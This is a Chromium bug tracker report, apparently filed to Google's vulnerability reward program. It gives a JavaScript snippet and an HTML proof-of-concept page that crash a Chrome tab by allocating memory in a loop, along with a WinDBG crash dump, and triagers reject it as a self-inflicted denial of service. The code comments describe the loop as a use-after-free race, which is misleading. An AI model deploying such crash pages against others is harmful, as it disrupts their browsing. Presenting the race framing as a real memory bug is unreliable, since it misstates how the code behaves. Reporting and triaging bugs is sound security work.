@@ -1,0 +1,329 @@
+Issue ID: 446678246
+
+Author: bu...@google.com
+<hr>
+<h3>Report description</h3>
+<p>out-of-memory crashing render process possible DoS or resource-exhaustion</p>
+<hr>
+<h3>Bug location</h3>
+<h4>Where do you want to report your vulnerability?</h4>
+<p>Chrome VRP – Report security issues affecting the Chrome browser. <a href="https://bughunters.google.com/about/rules/5745167867576320/chrome-vulnerability-reward-program-rules" data-b-widget="url" data-b-original-href="https://bughunters.google.com/about/rules/5745167867576320/chrome-vulnerability-reward-program-rules" data-b-redirected-href="https://www.google.com/url?q=https://bughunters.google.com/about/rules/5745167867576320/chrome-vulnerability-reward-program-rules&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw31QXnMd5mgu42yXMeOAv3K">See program rules</a></p>
+<h4>Which URL (or repository) have you found the vulnerability in?</h4>
+<p>none</p>
+<hr>
+<h3>The problem</h3>
+<h4>Please describe the technical details of the vulnerability</h4>
+<h2>Out-of-memory crashing render process possible DoS or resource-exhaustion</h2>
+<p>chrome version: Version 140.0.7339.186 (Official Build) (64-bit)</p>
+<p>Run this following code in console</p>
+<pre><code><span class="stx-keyword">async</span> <span class="stx-keyword">function</span> <span>raceCrash</span>() {
+  <span class="stx-keyword">let</span> <span>obj</span> = {};
+  <span class="stx-keyword">for</span> (<span class="stx-keyword">let</span> <span>i</span> = <span class="stx-number">0</span>; i &lt; <span class="stx-number">10000</span>; i++) {
+    Promise.resolve().then(() =&gt; <span class="stx-keyword">delete</span> obj.prop); <span class="stx-comment">// Free property</span>
+    obj.prop = <span class="stx-keyword">new</span> Array(<span class="stx-number">1</span> &lt;&lt; <span class="stx-number">20</span>); <span class="stx-comment">// Reallocate</span>
+    console.log(obj.prop); <span class="stx-comment">// Access during race</span>
+  }
+}
+raceCrash();
+</code></pre>
+<p>or use this html poc</p>
+<pre><code>&lt;!DOCTYPE html&gt;
+&lt;<span class="stx-keyword">html</span> lang=<span class="stx-string">&quot;en&quot;</span>&gt;
+&lt;<span class="stx-keyword">head</span>&gt;
+    &lt;<span class="stx-keyword">meta</span> charset=<span class="stx-string">&quot;UTF-8&quot;</span>&gt;
+    &lt;<span class="stx-keyword">meta</span> name=<span class="stx-string">&quot;viewport&quot;</span> content=<span class="stx-string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;
+    &lt;<span class="stx-keyword">title</span>&gt;oom leading DoS or resource-exhaustion&lt;/<span class="stx-keyword">title</span>&gt;
+    &lt;<span class="stx-keyword">style</span>&gt;
+        body {
+            font-family: Arial, sans-serif;
+            margin: <span class="stx-number">20</span>px;
+        }
+        #output {
+            border: <span class="stx-number">1</span>px solid #ccc;
+            padding: <span class="stx-number">10</span>px;
+            max-height: <span class="stx-number">300</span>px;
+            overflow-y: auto;
+        }
+        button {
+            padding: <span class="stx-number">10</span>px <span class="stx-number">20</span>px;
+            font-size: <span class="stx-number">16</span>px;
+            cursor: pointer;
+        }
+    &lt;/<span class="stx-keyword">style</span>&gt;
+&lt;/<span class="stx-keyword">head</span>&gt;
+&lt;<span class="stx-keyword">body</span>&gt;
+    &lt;<span class="stx-keyword">h1</span>&gt;out-of-memory&lt;/<span class="stx-keyword">h1</span>&gt;
+    &lt;<span class="stx-keyword">p</span>&gt;simply click the button to run the raceCrash function and check the browser console output for results.&lt;/<span class="stx-keyword">p</span>&gt;
+    &lt;<span class="stx-keyword">p</span>&gt;&lt;<span class="stx-keyword">strong</span>&gt;Warning:&lt;/<span class="stx-keyword">strong</span>&gt; this can cause browser crashes due to rapid memory allocation and deallocation.&lt;/<span class="stx-keyword">p</span>&gt;
+    &lt;<span class="stx-keyword">button</span> onclick=<span class="stx-string">&quot;startRaceCrash()&quot;</span>&gt;Run raceCrash&lt;/<span class="stx-keyword">button</span>&gt;
+    &lt;<span class="stx-keyword">h2</span>&gt;Output:&lt;/<span class="stx-keyword">h2</span>&gt;
+    &lt;<span class="stx-keyword">div</span> id=<span class="stx-string">&quot;output&quot;</span>&gt;&lt;/<span class="stx-keyword">div</span>&gt;
+
+    &lt;<span class="stx-keyword">script</span>&gt;
+        async function raceCrash() {
+            let obj = {};
+            for (let i = <span class="stx-number">0</span>; i &lt; <span class="stx-number">10000</span>; i++) {
+                Promise.resolve().then(() =&gt; delete obj.prop); // Free property
+                obj.prop = new Array(<span class="stx-number">1</span> &lt;&lt; <span class="stx-number">20</span>); // Reallocate (<span class="stx-number">1</span>MB array)
+                console.log(obj.prop); // Access during race
+                // Append to output div for visibility
+                document.getElementById(<span class="stx-string">&#39;output&#39;</span>).innerText += `Iteration ${i}: Array created, length ${obj.prop.length}\n`;
+            }
+        }
+
+        function startRaceCrash() {
+            document.getElementById(<span class="stx-string">&#39;output&#39;</span>).innerText = <span class="stx-string">&#39;Starting raceCrash...\n&#39;</span>;
+            raceCrash().catch(err =&gt; {
+                console.error(<span class="stx-string">&#39;Error:&#39;</span>, err);
+                document.getElementById(<span class="stx-string">&#39;output&#39;</span>).innerText += `Error: ${err.message}\n`;
+            });
+        }
+    &lt;/<span class="stx-keyword">script</span>&gt;
+&lt;/<span class="stx-keyword">body</span>&gt;
+&lt;/<span class="stx-keyword">html</span>&gt;
+</code></pre>
+<p><strong>WinDBG Dump</strong></p>
+<pre><code>................................
+Loading unloaded module list
+...
+This dump file has an exception of interest stored in it.
+The stored exception information can be accessed via .ecxr
+(29cc.400c): Unknown exception - code e0000008 (first/second chance not available)
+For analysis of this file, run !analyze -v
+*** WARNING: Unable to verify checksum for ntdll.dll
+*** WARNING: Unable to verify checksum for KERNELBASE.dll
+ntdll!NtDelayExecution+0x14:
+00007ff8`04a8db74 c3              ret
+0:000&gt; .ecxr
+rax=00000bb4000ab800 rbx=0000005e045fbe58 rcx=00007fff8cf51db0
+rdx=0000005e045fb4d8 rsi=0000000000000000 rdi=00007fff95a56fd4
+rip=00007ff8020e5369 rsp=0000005e045fbc40 rbp=0000000000000000
+ r8=00000bb4029a9700  r9=0000005e045f2500 r10=000000233d5bd320
+r11=0000000000000000 r12=0000000000000000 r13=0000000000000001
+r14=0000005e045fbe58 r15=00000bb4004eaed0
+iopl=0         nv up ei pl nz na pe nc
+cs=0033  ss=0000  ds=0000  es=0000  fs=0053  gs=002b             efl=00000202
+KERNELBASE!RaiseException+0x69:
+00007ff8`020e5369 0f1f440000      nop     dword ptr [rax+rax]
+0:000&gt; !analyze -v
+.
+
+Press ctrl-c (cdb, kd, ntsd) or ctrl-break (windbg) to abort symbol loads that take too long.
+Run !sym noisy before .reload to track down problems loading symbols.
+
+...*** WARNING: Unable to verify checksum for KERNELBASE.dll
+.............................
+Loading unloaded module list
+...
+*** WARNING: Unable to verify checksum for ntdll.dll
+*******************************************************************************
+*                                                                             *
+*                        Exception Analysis                                   *
+*                                                                             *
+*******************************************************************************
+
+*** WARNING: Check Image - Checksum mismatch - Dump: 0x0, File: 0x30636a - C:\ProgramData\Dbg\sym\KERNELBASE.dll\565118542F6000\KERNELBASE.dll
+*** WARNING: Check Image - Checksum mismatch - Dump: 0x0, File: 0x30636a - C:\ProgramData\Dbg\sym\KERNELBASE.dll\565118542F6000\KERNELBASE.dll
+*** WARNING: Unable to verify checksum for chrome.dll
+*** WARNING: Unable to verify checksum for combase.dll
+*** WARNING: Unable to verify checksum for chrome_elf.dll
+
+KEY_VALUES_STRING: 1
+
+    Key  : Analysis.CPU.mSec
+    Value: 921
+
+    Key  : Analysis.Elapsed.mSec
+    Value: 23673
+
+    Key  : Analysis.IO.Other.Mb
+    Value: 0
+
+    Key  : Analysis.IO.Read.Mb
+    Value: 1
+
+    Key  : Analysis.IO.Write.Mb
+    Value: 0
+
+    Key  : Analysis.Init.CPU.mSec
+    Value: 859
+
+    Key  : Analysis.Init.Elapsed.mSec
+    Value: 26232
+
+    Key  : Analysis.Memory.CommitPeak.Mb
+    Value: 568
+
+    Key  : Analysis.Version.DbgEng
+    Value: 10.0.27920.1001
+
+    Key  : Analysis.Version.Description
+    Value: 10.2506.23.01 amd64fre
+
+    Key  : Analysis.Version.Ext
+    Value: 1.2506.23.1
+
+    Key  : Failure.Bucket
+    Value: APPLICATION_FAULT_e0000008_chrome.dll!Unknown
+
+    Key  : Failure.Exception.Code
+    Value: 0xe0000008
+
+    Key  : Failure.Exception.IP.Address
+    Value: 0x7ff8020e5369
+
+    Key  : Failure.Exception.IP.Module
+    Value: KERNELBASE
+
+    Key  : Failure.Exception.IP.Offset
+    Value: 0x25369
+
+    Key  : Failure.Hash
+    Value: {46f3582f-19fc-d11a-2674-e4fecf058223}
+
+    Key  : Failure.ProblemClass.Primary
+    Value: APPLICATION_FAULT
+
+    Key  : Timeline.Process.Start.DeltaSec
+    Value: 582
+
+    Key  : WER.Process.Version
+    Value: 140.0.7339.186
+
+
+FILE_IN_CAB:  0023f044-1c7c-4a0f-8d04-a014432290ea.dmp
+
+NTGLOBALFLAG:  0
+
+CONTEXT:  (.ecxr)
+rax=00000bb4000ab800 rbx=0000005e045fbe58 rcx=00007fff8cf51db0
+rdx=0000005e045fb4d8 rsi=0000000000000000 rdi=00007fff95a56fd4
+rip=00007ff8020e5369 rsp=0000005e045fbc40 rbp=0000000000000000
+ r8=00000bb4029a9700  r9=0000005e045f2500 r10=000000233d5bd320
+r11=0000000000000000 r12=0000000000000000 r13=0000000000000001
+r14=0000005e045fbe58 r15=00000bb4004eaed0
+iopl=0         nv up ei pl nz na pe nc
+cs=0033  ss=0000  ds=0000  es=0000  fs=0053  gs=002b             efl=00000202
+KERNELBASE!RaiseException+0x69:
+00007ff8`020e5369 0f1f440000      nop     dword ptr [rax+rax]
+Resetting default scope
+
+EXCEPTION_RECORD:  (.exr -1)
+ExceptionAddress: 00007ff8020e5369 (KERNELBASE!RaiseException+0x0000000000000069)
+   ExceptionCode: e0000008
+  ExceptionFlags: 00000001
+NumberParameters: 3
+   Parameter[0]: 0000000000000000
+   Parameter[1]: 0000000938399000
+   Parameter[2]: 000000043ffb5000
+
+PROCESS_NAME:  chrome.exe
+
+ERROR_CODE: (NTSTATUS) 0xe0000008 - &lt;Unable to get error code text&gt;
+
+EXCEPTION_CODE_STR:  e0000008
+
+EXCEPTION_PARAMETER1:  0000000000000000
+
+EXCEPTION_PARAMETER2:  0000000938399000
+
+EXCEPTION_PARAMETER3:  000000043ffb5000
+
+STACK_TEXT:<span>  </span>
+0000005e`045fbc40 00007fff`8b454ff0     : 00000bb4`00075600 00000000`0000008f 80000000`00000090 00007fff`88d264e9 : KERNELBASE!RaiseException+0x69
+0000005e`045fbd20 00007fff`8862a649     : 0000005e`045fbe58 00007fff`8c81a35f 0000005e`045fbe58 00007fff`88993f91 : chrome!IsSandboxedProcess+0x158a0
+0000005e`045fbdc0 00007fff`8b455009     : 0000005e`045fbe58 00000000`00000000 00007fff`95a56fd4 00007fff`962f4448 : chrome+0x3a649
+0000005e`045fbdf0 00007fff`93918f38     : 00000000`00000000 00008ad3`b37e168b 00000bb4`001b5c00 00000000`00000012 : chrome!IsSandboxedProcess+0x158b9
+0000005e`045fbe20 00007fff`8e46c824     : aaaaaaaa`aaaaaa00 0000005e`045fbfd8 00008ad3`b37e14bb 00007fff`962f4448 : chrome!sqlite3_dbdata_init+0x2083e58
+0000005e`045fbfa0 00007fff`8d3f8b25     : aaaaaaaa`aaaaaa00 0000005e`045fc10b 0000005e`045fc100 0000005e`045fc10b : chrome!IsSandboxedProcess+0x302d0d4
+0000005e`045fbfd0 00007fff`8ba04b9d     : 0000005e`045fc5b0 00008ad3`b37e69bb 00000000`00000000 00000bb4`00033980 : chrome!IsSandboxedProcess+0x1fb93d5
+0000005e`045fc2f0 00007fff`8b7daa80     : 00000000`00000000 00000000`00000000 00000000`00000000 00000000`00000000 : chrome!IsSandboxedProcess+0x5c544d
+0000005e`045fc3c0 00007fff`8b9e920c     : 00000000`00000000 00007fff`9753bfb0 00000000`00000020 00000000`00000011 : chrome!IsSandboxedProcess+0x39b330
+0000005e`045fc460 00007fff`89a0035c     : 00000bb4`000819a0 00007fff`8d36f557 00000000`00000000 00000000`0000001d : chrome!IsSandboxedProcess+0x5a9abc
+0000005e`045fc4d0 00007fff`89a0015f     : 00000000`00000000 00000000`00000000 00000000`00000010 00000bb4`0013c3b0 : chrome!ChromeMain+0x96ca1c
+0000005e`045fc580 00007fff`899ffe5f     : 0000005e`045fc658 00007fff`8e4ed133 00007fff`8d2631e7 0000005e`045fc8d0 : chrome!ChromeMain+0x96c81f
+0000005e`045fc620 00007fff`8b7e2a1d     : 00000bb4`004dc000 0000005e`045fc868 00000bb4`00081808 00007fff`8e4f8992 : chrome!ChromeMain+0x96c51f
+0000005e`045fc6a0 00007fff`8b7df328     : 0000005e`045fc6f8 00000bb4`004dc000 0000005e`045fc8e0 0000005e`045fc9a8 : chrome!IsSandboxedProcess+0x3a32cd
+0000005e`045fc710 00007fff`8b7dde6c     : 00000000`00000001 00000000`00000000 00000bb4`004dd598 00008ad3`b37e6c9b : chrome!IsSandboxedProcess+0x39fbd8
+0000005e`045fc7d0 00007fff`8d31e03a     : 00000000`001ad351 00000000`00000001 000002fc`001febd9 000002fc`001febd9 : chrome!IsSandboxedProcess+0x39e71c
+0000005e`045fc890 00007fff`c1ad30a9     : 000002fc`002fc93d 000002fc`00246f99 000002fc`00246f99 00000000`00200000 : chrome!IsSandboxedProcess+0x1ede8ea
+0000005e`045fc8d8 000002fc`002fc93d     : 000002fc`00246f99 000002fc`00246f99 00000000`00200000 0000005e`045fc9a8 : 0x00007fff`c1ad30a9
+0000005e`045fc8e0 000002fc`00246f99     : 000002fc`00246f99 00000000`00200000 0000005e`045fc9a8 00000000`00000000 : 0x000002fc`002fc93d
+0000005e`045fc8e8 000002fc`00246f99     : 00000000`00200000 0000005e`045fc9a8 00000000`00000000 000002fc`001c91c9 : 0x000002fc`00246f99
+0000005e`045fc8f0 00000000`00200000     : 0000005e`045fc9a8 00000000`00000000 000002fc`001c91c9 00000000`00000784 : 0x000002fc`00246f99
+0000005e`045fc8f8 0000005e`045fc9a8     : 00000000`00000000 000002fc`001c91c9 00000000`00000784 000002fc`001d76d5 : 0x200000
+0000005e`045fc900 00000000`00000000     : 000002fc`001c91c9 00000000`00000784 000002fc`001d76d5 000002fc`00005b01 : 0x0000005e`045fc9a8
+
+
+STACK_COMMAND: ~0s; .ecxr ; kb
+
+SYMBOL_NAME:  chrome+2e64ff0
+
+MODULE_NAME: chrome
+
+IMAGE_NAME:  chrome.dll
+
+FAILURE_BUCKET_ID:  APPLICATION_FAULT_e0000008_chrome.dll!Unknown
+
+OSPLATFORM_TYPE:  x64
+
+OSNAME:  Windows 10
+
+IMAGE_VERSION:  140.0.7339.186
+
+FAILURE_ID_HASH:  {46f3582f-19fc-d11a-2674-e4fecf058223}
+
+Followup:     MachineOwner
+---------
+</code></pre>
+<h4>Impact analysis – Please briefly explain who can exploit the vulnerability, and what they gain when doing so</h4>
+<p>dos</p>
+<hr>
+<h3>The cause</h3>
+<h4>What version of Chrome have you found the security issue in?</h4>
+<p>Version 140.0.7339.186 (Official Build) (64-bit)</p>
+<h4>Is the security issue related to a crash?</h4>
+<p>Yes, it is related to a crash.</p>
+<h4>Choose the type of vulnerability</h4>
+<p>Denial of Service (DoS)</p>
+<h4>How would you like to be publicly acknowledged for your report?</h4>
+<p>RashidKhan Pathan</p>
+
+Author: bu...@google.com
+google_domain
+
+Author: pa...@gmail.com
+out-of-memory crashing render process possible DoS or resource-exhaustion
+
+Author: pa...@gmail.com
+type.googleapis.com/google.devtools.issuetracker.v1.User
+
+Author: pa...@gmail.com
+public_non_google
+
+Author: se...@chromium.org
+type.googleapis.com/google.devtools.issuetracker.v1.User
+
+Author: se...@chromium.org
+public_non_google
+
+Author: ch...@google.com
+type.googleapis.com/google.protobuf.Int64Value
+
+Author: ch...@google.com
+google_domain
+
+Author: dr...@chromium.org
+<p>[security triage] Thank you for the report. This only demonstrates that a site can crash its own process due to being out of memory. This is a self-inflicted denial of service, so we don&#39;t see any security impact (see <a href="https://chromium.googlesource.com/chromium/src/+/HEAD/docs/security/faq.md#Are-denial-of-service-issues-considered-security-bugs" data-b-widget="url" data-b-original-href="https://chromium.googlesource.com/chromium/src/+/HEAD/docs/security/faq.md#Are-denial-of-service-issues-considered-security-bugs" data-b-redirected-href="https://www.google.com/url?q=https://chromium.googlesource.com/chromium/src/%2B/HEAD/docs/security/faq.md%23Are-denial-of-service-issues-considered-security-bugs&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw1kbb46Y9EWGN53Sppv_V5g">this</a> FAQ entry)</p>
+
+Author: dr...@chromium.org
+public_non_google
+
+Author: dr...@chromium.org
+type.googleapis.com/google.protobuf.Int32Value
+
+Author: ch...@google.com
+<p>This bug has been closed for more than 14 weeks. Removing issue access restrictions.</p>
+
+Author: ch...@google.com
+type.googleapis.com/google.devtools.issuetracker.v1.IssueAccessLimit
